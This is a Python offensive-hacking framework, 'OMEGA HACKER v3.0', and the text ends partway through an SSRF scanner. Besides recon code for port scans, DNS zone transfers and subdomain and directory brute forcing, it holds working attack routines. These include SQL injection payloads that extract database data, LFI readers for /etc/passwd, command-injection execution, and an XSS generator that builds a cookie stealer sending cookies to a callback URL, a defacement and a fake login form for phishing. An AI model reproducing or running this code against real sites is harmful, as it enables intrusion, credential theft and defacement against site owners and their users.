#!/usr/bin/env python3
"""OMEGA HACKER v3.0 - OMEGA GOD-TIER OFFENSIVE FRAMEWORK"""
import os, sys, re, json, time, random, socket, ssl, urllib.parse, hashlib, base64, struct, ipaddress, threading, queue, concurrent.futures, subprocess
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote
from collections import defaultdict

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings()
    HAS_REQUESTS = True
except Exception:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except Exception:
    HAS_BS4 = False

try:
    import dns.resolver, dns.zone, dns.query
    HAS_DNS = True
except Exception:
    HAS_DNS = False

try:
    from colorama import init, Fore, Style
    init()
except Exception:
    class Fore:
        RED=GREEN=YELLOW=BLUE=CYAN=MAGENTA=WHITE=RESET=''
    class Style:
        BRIGHT=DIM=NORMAL=RESET_ALL=''

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
]

def get_session(timeout=15, retries=1):
    s = requests.Session()
    retry = Retry(total=retries, backoff_factor=0.3, status_forcelist=[500,502,503,504])
    adapter = HTTPAdapter(max_retries=retry)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    s.headers.update({"User-Agent": random.choice(USER_AGENTS)})
    s.timeout = timeout
    s.verify = False
    return s

def random_ua():
    return random.choice(USER_AGENTS)

def extract_hostname(target):
    target = target.strip()
    if target.startswith(("http://", "https://")):
        return urlparse(target).hostname
    return target.split("/")[0].split(":")[0]

def ensure_url(target):
    target = target.strip()
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    return target
COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 111: "RPC", 135: "RPC", 139: "NetBIOS",
    143: "IMAP", 161: "SNMP", 389: "LDAP", 443: "HTTPS", 445: "SMB",
    465: "SMTPS", 500: "IKE", 587: "SMTP", 636: "LDAPS",
    993: "IMAPS", 995: "POP3S", 1080: "SOCKS", 1194: "OpenVPN",
    1433: "MSSQL", 1521: "Oracle", 1723: "PPTP", 2049: "NFS",
    2082: "cPanel", 2083: "cPanel SSL", 2181: "ZooKeeper",
    2375: "Docker", 2376: "Docker TLS", 3306: "MySQL", 3389: "RDP",
    4444: "Metasploit", 5432: "PostgreSQL", 5555: "ADB",
    5900: "VNC", 5984: "CouchDB", 5985: "WinRM HTTP", 5986: "WinRM HTTPS",
    6379: "Redis", 6443: "Kubernetes", 7001: "WebLogic",
    8000: "HTTP", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt",
    9000: "HTTP", 9042: "Cassandra", 9092: "Kafka",
    9200: "Elasticsearch", 9300: "Elasticsearch",
    11211: "Memcached", 27017: "MongoDB",
}

HTTP_PORTS = {80, 443, 8080, 8443, 8000, 8888, 8008, 8081, 8090, 9000, 9090, 9443, 3000, 5000, 4200}

def scan_port(host, port, timeout=2):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        if result == 0:
            return port, "open", COMMON_PORTS.get(port, "Unknown")
        return port, "closed", ""
    except Exception:
        return port, "error", ""

def scan_ports(host, ports=None, timeout=2, max_workers=100):
    if ports is None:
        ports = list(COMMON_PORTS.keys())
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futs = {executor.submit(scan_port, host, p, timeout): p for p in ports}
        for f in concurrent.futures.as_completed(futs):
            port, status, service = f.result()
            if status == "open":
                results.append((port, service))
    results.sort(key=lambda x: x[0])
    return results

DNS_RECORD_TYPES = ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME"]

COMMON_SUBDOMAINS = [
    "www", "mail", "ftp", "admin", "blog", "webmail", "server", "ns1", "ns2",
    "smtp", "pop3", "imap", "vpn", "ssh", "dev", "test", "api", "app",
    "beta", "demo", "shop", "store", "portal", "cms", "wp", "wordpress",
    "joomla", "forum", "support", "help", "docs", "wiki", "status", "cdn",
    "static", "assets", "img", "images", "css", "js", "video", "media",
    "download", "uploads", "files", "file", "data", "db", "database",
    "backup", "backups", "old", "new", "temp", "tmp",
    "stage", "staging", "prod", "production", "dev2", "develop",
    "git", "svn", "jenkins", "jira", "confluence", "gitlab", "bitbucket",
    "ci", "cd", "build", "builds", "release", "releases", "dashboard",
    "monitor", "monitoring", "logs", "log", "analytics", "tracking",
    "search", "proxy", "gateway", "web", "www2", "www1", "www3",
    "ns1", "ns2", "ns3", "ns4", "dns1", "dns2", "mail2", "mail1",
    "sip", "voip", "phone", "remote", "access", "secure", "ssl",
    "pay", "payment", "checkout", "cart", "billing", "invoice",
    "whm", "cpanel", "plesk", "drupal", "moodle", "phpmyadmin",
    "phpadmin", "administrator", "admin2", "root", "system",
    "manager", "management", "config", "configuration", "setup",
    "install", "installer", "update", "updates", "upgrade",
    "client", "customers", "partners", "vendors", "suppliers",
    "hr", "employees", "staff", "intranet", "corp", "office",
    "owa", "exchange", "webmail", "roundcube",
    "calendar", "drive", "cloud", "nextcloud", "owncloud",
    "sync", "mobile", "m", "mobi", "ios", "android", "app",
    "play", "store", "market", "news", "info", "about", "contact",
    "service", "services", "partner", "community", "network",
    "s3", "bucket", "storage", "object", "files",
    "lambda", "function", "functions", "serverless",
    "redis", "mongo", "mysql", "postgres", "couch",
    "solr", "elasticsearch", "kafka", "zookeeper",
    "graphql", "api2", "api3", "v1", "v2", "v3",
    "rest", "soap", "xmlrpc", "json", "websocket",
    "socket", "stream", "events", "event", "notification",
    "alerts", "alert", "webhook", "webhooks", "callback",
    "node", "nodes", "cluster", "cluster1", "cluster2",
    "us", "eu", "asia", "na", "sa", "africa", "oceania",
    "nyc", "sfo", "lax", "ord", "dfw", "atl", "mia", "sea",
    "lon", "par", "fra", "ams", "syd", "hkg", "sin", "tokyo",
    "internal", "corp", "office365", "sharepoint", "teams",
    "zoom", "skype", "slack", "discord", "telegram",
    "auth", "login", "sso", "oauth", "identity", "accounts",
    "register", "signup", "signin", "logout", "forgot",
    "my", "profile", "user", "users", "account", "accounts",
    "billing", "invoice", "invoices", "receipt", "payment",
    "checkout", "cart", "shop", "store", "order", "orders",
    "track", "tracking", "ship", "shipping", "delivery",
    "help", "helpdesk", "support", "ticket", "tickets",
    "chat", "livechat", "talk", "customer", "service",
    "docs", "documentation", "wiki", "knowledgebase",
    "forum", "community", "groups", "board", "boards",
    "status", "uptime", "health", "monitor", "statuspage",
    "blog", "news", "press", "media", "gallery", "photos",
    "careers", "jobs", "job", "career", "join",
    "events", "event", "webinar", "webinars", "meetup",
    "developers", "developer", "dev", "api", "apis",
    "sandbox", "sandbox-api", "sandbox-api-v1",
    "legal", "terms", "privacy", "gdpr", "ccpa",
    "security", "security", "trust", "bugbounty",
]

def dns_lookup(domain, record_type="A"):
    if not HAS_DNS:
        try:
            r = subprocess.run(["nslookup", "-type=" + record_type, domain], capture_output=True, text=True, timeout=10)
            return r.stdout
        except Exception:
            return ""
    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 5
        resolver.lifetime = 5
        try:
            answers = resolver.resolve(domain, record_type)
            return [str(r) for r in answers]
        except Exception:
            return []
    except Exception:
        return []

def dns_zone_transfer(domain, nameserver=None):
    if not HAS_DNS:
        return "DNS module not available"
    try:
        if nameserver:
            zone = dns.zone.from_xfr(dns.query.xfr(nameserver, domain, timeout=10))
            records = []
            for name, node in zone.nodes.items():
                for rds in node.rdatasets:
                    for rdata in rds:
                        records.append(f"{name} {rds.rdtype} {rdata}")
            return records
        else:
            resolver = dns.resolver.Resolver()
            ns_records = resolver.resolve(domain, "NS")
            results = {}
            for ns_record in ns_records:
                ns = str(ns_record)
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(ns, domain, timeout=10))
                    records = []
                    for name, node in zone.nodes.items():
                        for rds in node.rdatasets:
                            for rdata in rds:
                                records.append(f"{name} {rds.rdtype} {rdata}")
                    results[ns] = records
                except Exception as e:
                    results[ns] = f"Failed: {str(e)[:50]}"
            return results
    except Exception as e:
        return f"Zone transfer error: {str(e)[:100]}"

def subdomain_bruteforce(domain, subdomains=None, max_workers=50, timeout=5):
    if subdomains is None:
        subdomains = COMMON_SUBDOMAINS
    found = []
    def check_sub(sub):
        try:
            full = f"{sub}.{domain}"
            ip = socket.gethostbyname(full)
            return sub, ip
        except Exception:
            return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futs = {executor.submit(check_sub, sub): sub for sub in subdomains}
        for f in concurrent.futures.as_completed(futs):
            result = f.result()
            if result:
                found.append(result)
    return sorted(found, key=lambda x: x[0])

def full_dns_enum(domain):
    results = {"domain": domain, "records": {}, "zone_transfer": None, "subdomains": []}
    for rtype in DNS_RECORD_TYPES:
        try:
            answers = dns_lookup(domain, rtype)
            if answers:
                results["records"][rtype] = answers[:10]
        except Exception:pass
    try:
        zt = dns_zone_transfer(domain)
        if zt and isinstance(zt, dict):
            results["zone_transfer"] = zt
    except Exception:pass
    return results

def whois_lookup(domain):
    if not HAS_WHOIS:
        return {"error": "whois module not available"}
    try:
        w = whois.whois(domain)
        return {
            "domain": domain,
            "registrar": str(w.registrar or ""),
            "creation_date": str(w.creation_date or ""),
            "expiration_date": str(w.expiration_date or ""),
            "name_servers": [str(ns) for ns in (w.name_servers or [])[:10]],
            "organization": str(w.org or ""),
            "country": str(w.country or ""),
            "emails": [str(e) for e in (w.emails or [])],
        }
    except Exception as e:
        return {"error": str(e)[:200]}
TECH_SIGNATURES = {
    "WordPress": ["wp-content", "wp-json", "WordPress"],
    "Joomla": ["joomla", "com_content", "option=com_"],
    "Drupal": ["drupal", "sites/default", "drupal.js"],
    "Magento": ["magento", "skin/frontend"],
    "Shopify": ["shopify", "myshopify", "cdn.shopify"],
    "WooCommerce": ["woocommerce", "wc-api"],
    "Django": ["django", "csrftoken"],
    "Flask": ["flask", "Jinja2"],
    "Laravel": ["laravel", "XSRF-TOKEN"],
    "Ruby on Rails": ["rails", "_rails"],
    "ASP.NET": ["asp.net", "__VIEWSTATE", "__EVENTVALIDATION"],
    "PHP": ["php", "X-Powered-By: PHP"],
    "nginx": ["nginx"],
    "Apache": ["apache", "Apache"],
    "IIS": ["IIS", "Microsoft-IIS"],
    "Cloudflare": ["cloudflare", "__cfduid"],
    "Akamai": ["akamai"],
    "Fastly": ["fastly"],
    "jQuery": ["jquery"],
    "Bootstrap": ["bootstrap"],
    "React": ["react", "react-dom"],
    "Vue.js": ["vue", "vuejs"],
    "Angular": ["angular", "ng-"],
    "Node.js": ["node", "express"],
    "Tomcat": ["tomcat"],
    "Jenkins": ["jenkins"],
    "GitLab": ["gitlab"],
    "AWS": ["amazonaws", "cloudfront"],
    "Azure": ["azure", "windows.net"],
    "Google Cloud": ["googlecloud", "appspot"],
}

def detect_technologies(url, timeout=10):
    techs = {}
    try:
        resp = get_session(timeout=timeout).get(url, allow_redirects=True)
        headers = dict(resp.headers)
        body = resp.text.lower()
        server = headers.get("Server", "")
        x_powered = headers.get("X-Powered-By", "")
        set_cookie = str(headers.get("Set-Cookie", ""))
        for tech, patterns in TECH_SIGNATURES.items():
            for pattern in patterns:
                pl = pattern.lower()
                if pl in body or pl in server.lower() or pl in x_powered.lower() or pl in set_cookie.lower():
                    techs[tech] = "detected"
                    break
        resp.close()
    except Exception:
        return {"error": "Connection failed"}
    return techs

COMMON_DIRS = [
    "admin", "administrator", "wp-admin", "wp-content", "wp-includes",
    "backup", "backups", "db", "database", "sql", "dump",
    "config", "configuration", "conf", "settings", "env", ".env",
    "git", ".git", "svn", ".svn",
    "api", "v1", "v2", "rest", "graphql",
    "login", "signin", "signup", "register", "forgot", "reset",
    "phpmyadmin", "pma", "adminer",
    "test", "tests", "dev", "debug", "temp", "tmp",
    "upload", "uploads", "download", "downloads", "files", "file",
    "logs", "log", "error", "errors", "error_log",
    "robots.txt", "sitemap.xml", "crossdomain.xml",
    "index.php", "index.html", "default.aspx",
    "web.config", "htaccess", ".htaccess", "wp-config.php",
    "install", "installer", "setup", "wizard", "upgrade",
    "css", "js", "assets", "static", "dist", "build",
    "img", "images", "media", "video", "audio",
    "server-status", "server-info", "status",
    "cgi-bin", "cgi", "cgi-bin/status",
    "xmlrpc.php", "wp-json", "wp-cron.php",
    "README", "readme", "README.md", "CHANGELOG",
    "composer.json", "package.json",
    "Dockerfile", "docker-compose.yml",
    "swagger", "swagger.json", "openapi.json", "api-docs",
    "phpinfo.php", "info.php", "test.php",
    "dashboard", "monitor", "monitoring", "health", "healthz",
    "metrics", "prometheus",
    "actuator", "actuator/health", "actuator/info", "actuator/env",
    "swagger-ui.html", "v2/api-docs",
    ".aws", "credentials", ".credentials",
    "security.txt", "humans.txt",
    "crossdomain.xml", "clientaccesspolicy.xml",
    "uploads", "public", "private", "restricted", "internal",
    "stage", "staging", "dev", "development", "qa", "testing",
    "uat", "preprod", "pre-production", "prod",
    "jenkins", "jira", "confluence", "sonar",
    "nexus", "artifactory", "docker", "portainer",
    "cgi-bin/php", "cgi-bin/php-cgi",
    "wp-admin/admin-ajax.php", "wp-content/debug.log",
]

COMMON_EXTENSIONS = ["", ".php", ".asp", ".aspx", ".jsp", ".html", ".txt", ".json", ".xml", ".bak", ".old", ".save", ".swp"]

def dir_bruteforce(base_url, wordlist=None, extensions=None, max_workers=30, timeout=8):
    if wordlist is None:
        wordlist = COMMON_DIRS
    if extensions is None:
        extensions = COMMON_EXTENSIONS[:3]
    found = []
    def check_path(path_url):
        try:
            resp = get_session(timeout=timeout).get(path_url, allow_redirects=True)
            s = resp.status_code
            sz = len(resp.content)
            resp.close()
            if s in [200,201,202,204,301,302,307,308,401,403,500,402,405]:
                return {"url": path_url, "status": s, "size": sz}
        except Exception:pass
        return None
    tasks = []
    for word in wordlist:
        w = word.strip()
        if not w:
            continue
        for ext in extensions:
            full_url = urljoin(base_url.rstrip("/") + "/", w + ext)
            tasks.append(full_url)
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futs = {executor.submit(check_path, url): url for url in tasks}
        for f in concurrent.futures.as_completed(futs):
            result = f.result()
            if result:
                found.append(result)
    found.sort(key=lambda x: (x["status"], x["url"]))
    return found
SQLI_ERROR_SIGS = [
    "You have an error in your SQL syntax", "Warning: mysql_", "Warning: mysqli_",
    "Warning: pg_", "Warning: mssql_", "Warning: sqlite_",
    "MySQLSyntaxErrorException", "Unclosed quotation mark", "SQLSTATE[",
    "SQL Server", "Incorrect syntax near", "Syntax error or access violation",
    "OLE DB", "Microsoft OLE DB Provider", "mysqli_fetch_array() expects",
    "Unknown column", "Table .* doesn't exist", "Column not found",
    "Could not find parameter", "Data type mismatch", "Unable to connect to",
    "Error Executing Database Query", "Invalid query", "ORA-[0-9]",
    "PLS-[0-9]", "SP2-[0-9]", "SQLite.Exception", "valid MySQL result",
    "PostgreSQL query failed", "DB2 SQL error", "Dynamic SQL Error",
    "Syntax error in string in query expression",
]

SQLI_PAYLOADS = [
    ("SingleQuote", "'"),
    ("DoubleQuote", '"'),
    ("OrTrue", "' OR '1'='1"),
    ("OrTrueDash", "' OR 1=1--"),
    ("OrTrueHash", "' OR 1=1#"),
    ("AndTrue", "' AND '1'='1"),
    ("AndFalse", "' AND '1'='2"),
    ("UnionNull", "' UNION SELECT NULL--"),
    ("UnionNull2", "' UNION SELECT NULL,NULL--"),
    ("UnionNull3", "' UNION SELECT NULL,NULL,NULL--"),
    ("TimeMySQL", "' OR SLEEP(2)--"),
    ("TimePG", "' OR PG_SLEEP(2)--"),
    ("TimeMSSQL", "' OR WAITFOR DELAY '0:0:2'--"),
    ("ErrorBased", "' AND 1=CONVERT(INT, @@VERSION)--"),
]

def test_sqli(url, param, timeout=15):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    findings = []
    for pname, payload in SQLI_PAYLOADS:
        test_val = (params[param][0] if params.get(param) else "1") + payload
        tp = params.copy()
        tp[param] = [test_val]
        nq = urllib.parse.urlencode(tp, doseq=True)
        tu = parsed._replace(query=nq).geturl()
        start = time.time()
        try:
            resp = get_session(timeout=timeout).get(tu, allow_redirects=False)
            elapsed = time.time() - start
            body = resp.text
            for sig in SQLI_ERROR_SIGS:
                if re.search(sig, body, re.IGNORECASE):
                    findings.append({"type": "Error-Based SQLi", "payload": pname, "error_sig": sig[:80], "confidence": 0.95})
                    break
            if elapsed >= 2.0 and ("SLEEP" in payload or "WAITFOR" in payload):
                findings.append({"type": "Time-Based SQLi", "payload": pname, "time": round(elapsed,1), "confidence": 0.85})
            resp.close()
        except Exception:pass
    return findings

def scan_sqli(url, timeout=15):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    all_findings = []
    if not params:
        try:
            resp = get_session(timeout=timeout).get(url)
            if HAS_BS4 and resp.status_code == 200:
                soup = BeautifulSoup(resp.text, "html.parser")
                for form in soup.find_all("form"):
                    action = form.get("action", "")
                    method = form.get("method", "get").lower()
                    form_url = urljoin(url, action)
                    for inp in form.find_all("input"):
                        name = inp.get("name", "")
                        if name and inp.get("type") in [None, "text", "email", "password", "search", "url"]:
                            for pname, payload in SQLI_PAYLOADS[:6]:
                                try:
                                    data = {i.get("name",""): ("test"+payload if i.get("name")==name else "test") for i in form.find_all("input") if i.get("name")}
                                    if method == "post":
                                        r = get_session(timeout=timeout).post(form_url, data=data, allow_redirects=False)
                                    else:
                                        r = get_session(timeout=timeout).get(form_url, params=data, allow_redirects=False)
                                    for sig in SQLI_ERROR_SIGS:
                                        if re.search(sig, r.text, re.IGNORECASE):
                                            all_findings.append({"type": "POST SQLi", "parameter": name, "payload": pname, "confidence": 0.9})
                                            break
                                    r.close()
                                except Exception:pass
            resp.close()
        except Exception:pass
        return all_findings
    for pn in params:
        finds = test_sqli(url, pn, timeout)
        for f in finds:
            f["parameter"] = pn
        all_findings.extend(finds)
    seen = set()
    unique = []
    for f in all_findings:
        key = (f.get("parameter",""), f.get("type",""))
        if key not in seen:
            seen.add(key)
            unique.append(f)
    return unique

def exploit_sqli_extract(url, param, technique="error", timeout=15):
    parsed = urlparse(url)
    base_params = parse_qs(parsed.query)
    extracted = []
    if technique == "error":
        queries = [
            ("version", "CONCAT(@@version,0x3a,USER())"),
            ("database", "DATABASE()"),
            ("tables", "(SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE())"),
        ]
        for name, query in queries:
            payloads = [
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT " + query + "),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
                "' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT " + query + "),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
            ]
            for payload in payloads:
                tp = base_params.copy()
                tp[param] = [(base_params[param][0] if base_params.get(param) else "1") + payload]
                nq = urllib.parse.urlencode(tp, doseq=True)
                tu = parsed._replace(query=nq).geturl()
                try:
                    resp = get_session(timeout=timeout).get(tu, allow_redirects=False)
                    matches = re.findall(r"'([^']*?)'", resp.text)
                    for m in matches:
                        if ":" in m or "@" in m:
                            extracted.append({"field": name, "value": m[:200]})
                    resp.close()
                except Exception:pass
    elif technique == "union":
        for nc in range(1, 6):
            nulls = ",".join(["NULL"]*nc)
            payload = "' UNION SELECT " + nulls + "--"
            tp = base_params.copy()
            tp[param] = [(base_params[param][0] if base_params.get(param) else "1") + payload]
            nq = urllib.parse.urlencode(tp, doseq=True)
            tu = parsed._replace(query=nq).geturl()
            try:
                resp = get_session(timeout=timeout).get(tu, allow_redirects=False)
                if resp.status_code == 200:
                    extracted.append({"field": f"union_cols_{nc}", "value": "Column count matches!"})
                    # Now extract data
                    for dp in [
                        "' UNION SELECT " + ",".join(["@@version"] + ["NULL"]*(nc-1)) + "--",
                        "' UNION SELECT " + ",".join(["DATABASE()"] + ["NULL"]*(nc-1)) + "--",
                        "' UNION SELECT " + ",".join(["GROUP_CONCAT(TABLE_NAME)"] + ["NULL"]*(nc-1)) + " FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()--",
                    ]:
                        tp2 = base_params.copy()
                        tp2[param] = [(base_params[param][0] if base_params.get(param) else "1") + dp]
                        nq2 = urllib.parse.urlencode(tp2, doseq=True)
                        tu2 = parsed._replace(query=nq2).geturl()
                        try:
                            r2 = get_session(timeout=timeout).get(tu2, allow_redirects=False)
                            body = r2.text[:1000]
                            # Get content difference from normal
                            np = base_params.copy()
                            nq3 = urllib.parse.urlencode(np, doseq=True)
                            nu = parsed._replace(query=nq3).geturl()
                            nr = get_session(timeout=timeout).get(nu, allow_redirects=False)
                            diff = body.replace(nr.text[:1000], "")
                            if diff and len(diff) > 3:
                                extracted.append({"field": "union_data", "value": diff[:200]})
                            nr.close()
                            r2.close()
                        except Exception:pass
                resp.close()
            except Exception:pass
            if extracted:
                break
    return extracted
XSS_PAYLOADS = [
    ("Basic", "<script>alert('XSS')</script>"),
    ("Img", '<img src=x onerror=alert("XSS")>'),
    ("Body", '<body onload=alert("XSS")>'),
    ("SVG", '<svg onload=alert("XSS")>'),
    ("Input", '<input autofocus onfocus=alert("XSS")>'),
    ("Details", '<details open ontoggle=alert("XSS")>'),
    ("Iframe", '<iframe onload=alert("XSS")>'),
    ("Audio", '<audio src=x onerror=alert("XSS")>'),
    ("Video", '<video src=x onerror=alert("XSS")>'),
    ("Div", '<div onmouseover=alert("XSS")>test</div>'),
]

def scan_xss(url, timeout=15):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    findings = []
    if not params:
        try:
            resp = get_session(timeout=timeout).get(url)
            if HAS_BS4 and resp.status_code == 200:
                soup = BeautifulSoup(resp.text, "html.parser")
                for form in soup.find_all("form"):
                    action = form.get("action", "")
                    method = form.get("method", "get").lower()
                    form_url = urljoin(url, action)
                    for inp in form.find_all("input"):
                        name = inp.get("name", "")
                        if name:
                            for pname, payload in XSS_PAYLOADS[:6]:
                                try:
                                    data = {i.get("name",""): (payload if i.get("name")==name else "test") for i in form.find_all("input") if i.get("name")}
                                    if method == "post":
                                        r = get_session(timeout=timeout).post(form_url, data=data, allow_redirects=False)
                                    else:
                                        r = get_session(timeout=timeout).get(form_url, params=data, allow_redirects=False)
                                    if payload in r.text:
                                        findings.append({"type": "POST XSS", "parameter": name, "payload": pname, "confidence": 0.9})
                                        break
                                    r.close()
                                except Exception:pass
            resp.close()
        except Exception:pass
        return findings
    for pn in params:
        for pname, payload in XSS_PAYLOADS:
            tp = params.copy()
            tp[pn] = [payload]
            nq = urllib.parse.urlencode(tp, doseq=True)
            tu = parsed._replace(query=nq).geturl()
            try:
                resp = get_session(timeout=timeout).get(tu, allow_redirects=False)
                if payload in resp.text:
                    findings.append({"type": "Reflected XSS", "parameter": pn, "payload": pname, "url": tu[:200], "confidence": 0.85})
                    break
                resp.close()
            except Exception:pass
    return findings

def generate_xss_exploit(url, param, payload_type="cookie_stealer", callback_url=""):
    exploits = {}
    if payload_type == "cookie_stealer" and callback_url:
        exploits["payload"] = f"<script>new Image().src='{callback_url}/?c='+document.cookie</script>"
        exploits["description"] = "Steals cookies to callback URL"
    elif payload_type == "deface":
        exploits["payload"] = "<script>document.body.innerHTML='<h1>HACKED BY OMEGA</h1>'</script>"
        exploits["description"] = "Defaces page"
    elif payload_type == "redirect" and callback_url:
        exploits["payload"] = f"<script>window.location='{callback_url}'</script>"
        exploits["description"] = "Redirects to another URL"
    elif payload_type == "phishing":
        exploits["payload"] = "<script>document.body.innerHTML='<div style=position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999><h2>Session Expired</h2><p>Please login:</p><form><input type=text name=user placeholder=Username><br><input type=password name=pass placeholder=Password><br><input type=submit value=Login></form></div>'</script>"
        exploits["description"] = "Phishing form for credentials"
    else:
        exploits["payload"] = "<script>alert('XSS')</script>"
        exploits["description"] = "Basic POC"
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if param in params:
        params[param] = [exploits["payload"]]
        nq = urllib.parse.urlencode(params, doseq=True)
        exploits["exploit_url"] = parsed._replace(query=nq).geturl()
    return exploits

LFI_PAYLOADS = [
    ("Basic", "/etc/passwd"),
    ("DotDot", "../../../../etc/passwd"),
    ("Encoded", "%2e%2e%2f%2e%2e%2fetc/passwd"),
    ("Windows", "C:\\Windows\\system.ini"),
    ("ProcEnv", "../../../../proc/self/environ"),
    ("PHPFilter", "php://filter/read=convert.base64-encode/resource=index"),
    ("PHPFilterPasswd", "php://filter/convert.base64-encode/resource=../../../etc/passwd"),
    ("Expect", "expect://id"),
]

LFI_INDICATORS = ["root:", "root:x:", "[boot loader]", "[drivers]", "www-data", "nobody:", "nt authority", "uid=", "extension="]

def scan_lfi(url, timeout=15):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    findings = []
    if not params:
        return findings
    for pn in params:
        for pname, payload in LFI_PAYLOADS:
            tp = params.copy()
            tp[pn] = [(params[pn][0] if params.get(pn) else "1") + payload]
            nq = urllib.parse.urlencode(tp, doseq=True)
            tu = parsed._replace(query=nq).geturl()
            try:
                resp = get_session(timeout=timeout).get(tu, allow_redirects=False)
                body = resp.text
                for ind in LFI_INDICATORS:
                    if ind in body:
                        findings.append({"type": "LFI", "parameter": pn, "payload": pname, "indicator": ind, "url": tu[:200], "confidence": 0.85})
                        break
                resp.close()
            except Exception:pass
    return findings

def exploit_lfi_read(url, param, file_to_read="/etc/passwd", timeout=15):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    paths = [
        file_to_read,
        "../../../../" + file_to_read.lstrip("/"),
        "../../../../../../" + file_to_read.lstrip("/"),
        "....//....//....//....//" + file_to_read.lstrip("/"),
    ]
    if file_to_read.endswith(".php"):
        paths = [
            "php://filter/read=convert.base64-encode/resource=" + file_to_read.lstrip("/"),
            "php://filter/convert.base64-encode/resource=../../../" + file_to_read.lstrip("/"),
        ] + paths
    for path in paths:
        tp = params.copy()
        tp[param] = [path]
        nq = urllib.parse.urlencode(tp, doseq=True)
        tu = parsed._replace(query=nq).geturl()
        try:
            resp = get_session(timeout=timeout).get(tu, allow_redirects=False)
            body = resp.text
            if "php://" in str(path):
                b64m = re.search(r'([A-Za-z0-9+/=]{50,})', body)
                if b64m:
                    try:
                        decoded = base64.b64decode(b64m.group(1)).decode("utf-8", errors="ignore")
                        if len(decoded) > 10:
                            return {"file": file_to_read, "content": decoded[:2000], "method": "php_filter"}
                    except Exception:pass
            if "root:" in body or file_to_read in body:
                lines = [l for l in body.split("\n") if ":" in l]
                if lines:
                    return {"file": file_to_read, "content": "\n".join(lines[:20])[:2000], "method": "direct"}
            resp.close()
        except Exception:pass
    return {"file": file_to_read, "content": None, "method": "failed"}

CMDI_PAYLOADS = [
    ("Semicolon", "; id"),
    ("Pipe", "| id"),
    ("AND", "&& id"),
    ("OR", "|| id"),
    ("Backtick", "`id`"),
    ("Subshell", "$(id)"),
    ("SemicolonWin", "; whoami"),
    ("PipeWin", "| whoami"),
    ("ANDWin", "&& whoami"),
]

CMDI_INDICATORS = ["uid=", "gid=", "groups=", "nt authority", "www-data", "nobody", "apache", "nginx", "bin:", "daemon:"]

def scan_cmdi(url, timeout=15):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    findings = []
    if not params:
        return findings
    for pn in params:
        for pname, payload in CMDI_PAYLOADS:
            tp = params.copy()
            tp[pn] = [(params[pn][0] if params.get(pn) else "1") + payload]
            nq = urllib.parse.urlencode(tp, doseq=True)
            tu = parsed._replace(query=nq).geturl()
            try:
                resp = get_session(timeout=timeout).get(tu, allow_redirects=False)
                body = resp.text.lower()
                for ind in CMDI_INDICATORS:
                    if ind in body:
                        findings.append({"type": "Command Injection", "parameter": pn, "payload": pname, "indicator": ind, "url": tu[:200], "confidence": 0.85})
                        break
                resp.close()
            except Exception:pass
    return findings

def exploit_cmdi_execute(url, param, command="id", timeout=15):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    patterns = [
        "; " + command, "| " + command, "&& " + command, "|| " + command,
        "`" + command + "`", "$(" + command + ")",
    ]
    results = {}
    for pattern in patterns:
        tp = params.copy()
        tp[param] = [(params[param][0] if params.get(param) else "1") + pattern]
        nq = urllib.parse.urlencode(tp, doseq=True)
        tu = parsed._replace(query=nq).geturl()
        try:
            resp = get_session(timeout=timeout).get(tu, allow_redirects=False)
            body = resp.text
            if "uid=" in body or "nt authority" in body.lower() or "www-data" in body:
                lines = [l.strip() for l in body.split("\n") if l.strip() and not l.startswith("<") and len(l.strip()) > 3]
                if lines:
                    results[pattern] = lines[:10]
            resp.close()
        except Exception:pass
    return results if results else {"status": "No command output visible"}

SSRF_PARAMS = ["url", "uri", "redirect", "redirect_url", "callback", "callback_url", "return_url", "return_to", "next", "next_url", "goto", "target", "dest", "destination", "path", "file", "load", "read", "view", "page", "image", "img", "src", "source", "fetch", "link", "href", "domain", "host", "proxy", "forward", "endpoint", "webhook", "avatar"]

def scan_ssrf(url, timeout=15):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    findings = []
    test_urls = [
        "http://169.254.169.254/latest/meta-data/",
